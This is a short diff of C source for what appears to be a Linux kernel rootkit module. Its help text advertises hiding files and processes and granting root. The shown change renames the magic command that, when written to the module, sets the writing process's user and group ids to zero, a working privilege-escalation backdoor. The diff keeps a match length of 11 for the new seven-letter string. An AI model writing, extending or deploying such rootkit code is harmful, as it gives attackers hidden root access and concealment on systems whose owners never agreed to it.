@@ -139,7 +139,7 @@ static ssize_t rtkit_read(struct file *file, char __user *buff, size_t count, lo
 DESC:\n\
   hides files prefixed with __rt or 10-__rt and gives root\n\
 CMNDS:\n\
-  mypenislong - uid and gid 0 for writing process\n\
+  setroot - uid and gid 0 for writing process\n\
   hpXXXX - hides proc with id XXXX\n\
   up - unhides last process\n\
   thf - toogles file hiding\n\
@@ -167,7 +167,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 {
 	
 	copy_from_user(kernel_buff, buff, MIN(1024, count));
-	if (!strncmp(kernel_buff, "mypenislong", MIN(11, count))) { //changes to root
+	if (!strncmp(kernel_buff, "setroot", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
 		(credentials->uid).val = (credentials->euid).val = 0;
 		(credentials->gid).val = (credentials->egid).val = 0;
